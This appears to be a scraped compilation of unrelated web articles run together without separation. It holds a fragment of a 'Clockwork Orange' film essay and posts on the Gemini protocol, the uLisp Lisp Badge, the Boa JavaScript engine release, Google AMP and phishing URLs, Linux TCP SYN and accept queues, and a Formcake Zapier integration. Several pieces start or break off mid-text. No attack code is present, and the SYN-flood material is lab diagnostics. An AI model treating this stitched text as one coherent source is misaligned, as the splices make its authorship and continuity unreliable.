trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>

<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>
<h3><span>Specification</span></h3>
<p><strong>Size:</strong> 107mm x 61mm (4.2" x 2.4").</p>
<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>
<h4><strong>Language</strong></h4>
<p>uLisp, a subset of Common Lisp, with 122 Lisp functions and special forms. For a full definition see <a href="http://www.ulisp.com/show?3L" target="_blank">uLisp Language Reference</a>.</p>
<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>

  <article>
    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<div><div><pre><code>+----------------------------+-----------+-----------------+----------+------------+
| Item                       | Self time | % of total time | Time     | Item count |
+----------------------------+-----------+-----------------+----------+------------+
| From&lt;Object&gt;               | 1.04ms    | 14.776          | 1.04ms   | 146        |
+----------------------------+-----------+-----------------+----------+------------+

+----------------------------+-----------+-----------------+----------+------------+
| create_instrinsics         | 263.50µs  | 3.756           | 6.38ms   | 1          |
+----------------------------+-----------+-----------------+----------+------------+
| make_builtin_fn: toString  | 218.50µs  | 3.114           | 290.50µs | 12         |
+----------------------------+-----------+-----------------+----------+------------+
| String                     | 81.60µs   | 1.163           | 961.60µs | 1          |
+----------------------------+-----------+-----------------+----------+------------+
</code></pre></div></div>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

        <p>Take a look at the below screenshot from Safari for iOS. What website am I on?</p>

<p><img src="https://theinternetbytes.com/images/amp-nytimes-example.png" alt="AMP Example with NYTimes"></p>

<p>Based on the contents of the page, I’m clearly on a NYTimes property, but based
on the address bar I’m clearly on <code>google.com</code>. If I click in the address bar
I see <code>https://www.google.com/amp/s/www.nytimes.com/2020/05/22/technology/google-antitrust.amp.html</code>. Confused, I consult <a href="https://www.google.com/safebrowsing/static/faq.html">Google’s Safebrowsing FAQ</a>:</p>

<blockquote>
<p><strong>How can I tell if a page is a fake?</strong></p>

<p>The best thing to do is to check the page’s URL to make sure it’s actually controlled by the party it appears to be controlled by. The crucial part of the URL is the part between the http:// and the next slash (‘/’). (If there’s no slash, start at the end of the URL.) This is the part of the URL that determines site ownership. Some popular domains, for instance, are amazon, google, and ebay:</p>

<p><code>http://www.amazon.com</code><br>
<code>http://www.google.com</code><br>
<code>http://www.ebay.com</code></p>

<p>In some cases, URLs will be a bit more complex; be sure to check the name listed immediately to the left of the top level domain (.com, .net, .co.uk, etc.).
For instance, <code>http://www.google.com</code>, <code>http://news.google.com</code> and <code>http://www.google.com/firefox/</code> are all part of the same site. However, <code>google.com.fraudulentdomain.com/login.html</code> is NOT! Neither is <code>www.g00gle.com</code> (note that in this URL, the letter o is replaced by the number 0).</p>
</blockquote>

<p>and determine I’m on <code>www.google.com</code>—but the confusion remains since
this is genuinely NYTimes content and branding.</p>

<p>This is a really dangerous pattern: Google serves NYTimes’ controlled<sup id="fnref:1"><a href="#fn:1">1</a></sup>
content on a Google domain (<code>www.google.com</code>) and wants the user to trust that it is NYTimes’ content. <strong>It confuses the user whether to trust the address in
URL bar or the content of the page</strong> Meanwhile Google, Internet safety groups, and workplaces actively try to
teach users to check domains and URL address bars. The confusion over trusting page content or address bar contents is precisely why phishing
attempts work so well. Humans trust visual indicators a lot. Google, with the AMP
Cache Project, is confusing humans more and training them to trust visual content
of the page over the URL in the address bar (in certain contexts)—despite telling them to do otherwise on different sites.
This surprises me since Google
spends a lot of time researching visual indicators of security in the address bar
(like the padlock icon)<sup id="fnref:2"><a href="#fn:2">2</a></sup>. In work security trainings and guides on the Internet,
we are trained to look at the address bar to help make a decision on whether to trust
a site, but the Google AMP Cache requires contradictory rules from what we’d use elsewhere.</p>

<p>The speed of AMP is a nice benefit<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there are still some UX challenges to handle in order
to reinforce—not muddy—the security lessons we teach Internet users.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<p>Unlike the SYN backlog, the accept queue has no backup plan for when it overflows. Back in the original call to <code>listen()</code>, a <code>backlog</code> argument was provided, which indicates how many connections can have completed the 3-way handshake and be waiting in the kernel for the application to accept.</p>

<p>This is the first common issue: If the <code>backlog</code> number provided to <code>listen()</code> is not large enough to contain any number of connections that could reasonably complete their handshake between 2 calls to <code>accept()</code>, then a connection will be dropped on the floor, and the application generally won’t even notice - the next call to …</p></article></div>

July 3, 2020 | https://formcake.com/blog/integrating-with-zapier | <a href="https://web.archive.org/web/*/https://formcake.com/blog/integrating-with-zapier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We <em>just</em> launched our integration with Zapier and have some thoughts to share on the process.</p>
<p>If you haven't heard of Zapier then you've probably never been asked to integrate your company’s API to a 3rd party product “as quickly as possible.” Zapier has become the API platform for the web and - as a company who takes in data and sheperds it through to other workflows - it was a no brainer to integrate Formcake with Zapier. Integration was straightforward enough, but still a bit of a journey, so hopefully these details that may interest those looking to do the same and shorten their learning curve a bit.</p>
<p>So what does Zapier ask from its integration partners? And what decisions did we have to make accommodate those requirements? Here is our list of top concerns.</p>
